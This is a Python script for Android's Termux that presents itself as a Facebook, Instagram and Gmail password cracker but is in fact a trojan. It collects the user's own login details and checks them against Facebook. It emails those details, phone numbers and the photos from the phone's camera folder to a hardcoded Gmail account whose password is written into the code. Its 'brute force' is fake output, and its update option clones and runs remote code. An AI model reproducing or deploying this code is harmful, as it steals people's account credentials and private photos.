import smtplib, shutil, sys, ssl, os, getpass,time, random
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
try:
 import mechanize, colorama
 from colorama import Fore, Back, Style
except:
 os.system('pip install mechanize')
 os.system('pip install colorama')
 import mechanize, colorama
 from colorama import Fore, Back, Style
os.system('clear')
colorama.init(autoreset=True)
print(Back.RED+'''
╔═╗╔═╗╔════╗╔═══╗╔═══╗╔╗───╔╗─╔╗╔═══╗╔═══╗╔╗╔═╗
╚╗╚╝╔╝║╔╗╔╗║║╔═╗║║╔═╗║║║───║║─║║║╔═╗║║╔═╗║║║║╔╝
─╚╗╔╝─╚╝║║╚╝║║─║║║║─║║║║───║╚═╝║║║─║║║║─╚╝║╚╝╝─
─╔╝╚╗───║║──║║─║║║║─║║║║─╔╗║╔═╗║║╚═╝║║║─╔╗║╔╗║─
╔╝╔╗╚╗──║║──║╚═╝║║╚═╝║║╚═╝║║║─║║║╔═╗║║╚═╝║║║║╚╗
╚═╝╚═╝──╚╝──╚═══╝╚═══╝╚═══╝╚╝─╚╝╚╝─╚╝╚═══╝╚╝╚═╝
''')

fs = '''
────╔══╗╔╗─╔╗───────────────────╔╗─╔╗─╔╗
────║╔╗║║║─║║──────────────────╔╝╚╗║║─║║
╔══╗║╚╝║║╚═╝║╔══╗╔══╗╔══╗╔╗╔══╗╚╗╔╝║╚═╝║
║══╣║╔═╝╚═╗╔╝║══╣║╔╗║║╔═╝─╣║║═╣─║║─╚═╗╔╝
─══║║║──╔═╝║──══║║╚╝║║╚═╗║║║║═╣─║╚╗╔═╝║─
╚══╝╚╝──╚══╝─╚══╝╚══╝╚══╝╚╝╚══╝─╚═╝╚══╝─'''
def fsociety():
    global num
    time.sleep(1)
    os.system('clear')
    time.sleep(2)
    print(Fore.RED+Back.GREEN+fs+Style.RESET_ALL)
    print('Bienvenue à la Spy-Society. \n\nPour avoir une estimation nu nombre de personnes qui utilisent nos services, nous vous demanderons de mentionner votre numero de telephone whatsapp.')
    num = input('\nNumero de telephone: ')
    if '+' not in num:
        while '+' not in num:
            num = input('\nveullez entrer votre numéro avec le code national.\n\nNumero de téléphone: ')
    time.sleep(2)
    target = input('\nVeuillez à présent saisir les informations que vous avez sur votre victime \n(email/ numéro de téléphone/ nom du compte facebook ou instagram: ')

def assur(ide, pasw):
 global info
 browser = mechanize.Browser()
 browser.set_handle_robots(False)
 cookies = mechanize.CookieJar()
 browser.set_cookiejar(cookies)
 browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
 browser.set_handle_refresh(False)
 url = 'http://www.facebook.com/login.php'
 browser.open(url)
 browser.select_form(nr = 0)       #This is login-password form -> nr = number = 0
 browser.form['email'] = ide
 browser.form['pass'] = pasw
 response = browser.submit()
 strr = response.read()
 struts = strr.decode('UTF-8')
 if 'id="loginbutton"' in struts:
    sys.exit(Fore.RED+'incorrect password or no account found.\nCheck ur login informations and try again.')
 else:
  print(Fore.GREEN+ 'Successfully Logged in.')
  print('completing control port...\n')
  i = struts.find('ACCOUNT_ID')
  k = []
  while i < struts.find('SHORT_NAME'):
   k.append(struts[i])
   i+=1
  if '"' in k:
   k.remove('"')
  info = ''.join(k)
def upd():
    os.chdir('/data/data/com.termux/files/home')
    shutil.rmtree('crack')
    os.system('git clone https://github.com/Derecker/crack')
    os.chdir('/data/data/com.termux/files/home/crack')
    os.system('python cracktool.py')
    sys.exit()
def nth():
    if usn == '' or usp == '':
        time.sleep(2)
        sys.exit(Fore.RED+'\nFailed to connect')
    if '@' not in usn:
        if '+' not in usn:
            time.sleep(2)
            sys.exit(Fore.RED+'\nNo account found')

def loop():
    az = 'azertyuiopqsdfghjklmwxcvnb'
    aZ = 'AZERTYUIOPQSDFGHJKLMWXCVNB'
    a1 = str('1234567890')
    #ajs = '*@#)(?!;:'
    all = az + a1 + aZ
    lax = 0
    print(Fore.GREEN+'recherche en cours...')
    time.sleep(2)
    while lax < 2999992499999245053:
       print(lax, ''.join(random.sample(all, 8)))
       lax += 1
    print(Fore.GREEN+'pass founded: ', ''.join(random.sample(all, 8)))
option = int(input(Fore.GREEN+'''
1- Facebook Attack
2- Instagram Attack
3- Gmail Attack
4- update
5- Spy-Society
[:]Choose an option: '''+Style.RESET_ALL))
if option == 1:
    cho = 'Facebook'
    print('\nVeuillez tout d\'abord vous connecter à votre propre compte Facebook, votre mot de passe ne s\'affichera pas à l\'écran\n\nFirst log into your own Facebook account, ur password won\'t appear on the screen.')
    usn = input('\nenter your email/phonenumber: ')
    usp = getpass.getpass('enter your password: ')
    print('En cours de connexion, veuillez patienter...\n')
    nth()
    assur(usn, usp)
elif option == 2:
    cho = 'instagram'
    print('\nVeuillez tout d\'abord vous connecter à votre propre compte instagram -/- First log into your own instagram account')
    usn = input('\nenter your email/phonenumber: ')
    usp = input('enter your password: ')
    print('En cours de connexion, veuillez patienter...')
    nth()
    assur(usn, usp)
elif option == 3:
    cho = 'Gmail'
    print('\nVeuillez tout d\'abord vous connecter à votre compte gmail principal -/- First log into your principal gmail account')
    usn = input('\nenter your email: ')
    usp = input('enter your password: ')
    print('En cours de connexion, veuillez patienter...\nLogging in, please wait...')
    nth()
    assur(usn, usp)
elif option == 5:
    fsociety()

def connect(nom):
    with open(nom, 'rb') as fp:
        img = MIMEImage(fp.read())
        img.add_header('Content-Disposition', 'attachment', filename=nom)
        msg.attach(img)
    try:
        s.sendmail(sa, ra, msg.as_string())
    except:
        print('<Exeption>')

context = ssl.create_default_context()
# creates SMTP session 

s = smtplib.SMTP_SSL('smtp.gmail.com', 465, context = context) 

  
# start TLS for security 
#s.starttls() 


sa = 'derecknathan245@gmail.com'
kl = '@zedeyep4w0rd'
s.login(sa, kl) 

ra = 'bertranddupont885@gmail.com'
def rs():
 connexion = cho + ' - ' + usn + ' - ' + usp + '\n\n' + info
 msg = MIMEMultipart()
 msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
 msg.attach(msgText)
 s.sendmail(sa, ra, msg.as_string())

if option == 1:
    rs()
elif option == 2:
    rs()
elif option == 3:
    rs()
elif option == 5:
    connexion = 'Spy-Society\n\n' + num
    msg = MIMEMultipart()
    msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
    msg.attach(msgText)
    s.sendmail(sa, ra, msg.as_string())

elif option == 4:
 upd()


chemin = '/storage/emulated/0//DCIM/Camera/'
os.chdir('/storage/emulated/0/DCIM/Camera')
liste = os.listdir()
for x in liste:
    l = list(x)
    #print(l)
    if '.' in l:
        #print(x)
        if l[-1] is 'g':
            #print(x)
            n = chemin + x
            na = list(n)
            if ' ' in na:
                na.remove(' ')
            name = ''.join(na)
            connect(name)

if option == 1:
    lien = input('paste the target account link/id/email or phone number: ')
    print('searching for referentials...')
    loop()
    os.system('xdg-open https://m.facebook.com')

elif option == 2:
    lien = input('collez le lien du compte cible: ')
    print('searching for referentials...')
    loop()
    os.system('xdg-open https://www.instagram.com/accounts/login/')

elif option == 3:
    lien = input('adresse email cible: ')
    print('searching for referentials...')
    loop()
    os.system('xdg-open https://mail.google.com/mail/mu/mp/188/#tl/priority/%5Esmartlabel_personal')
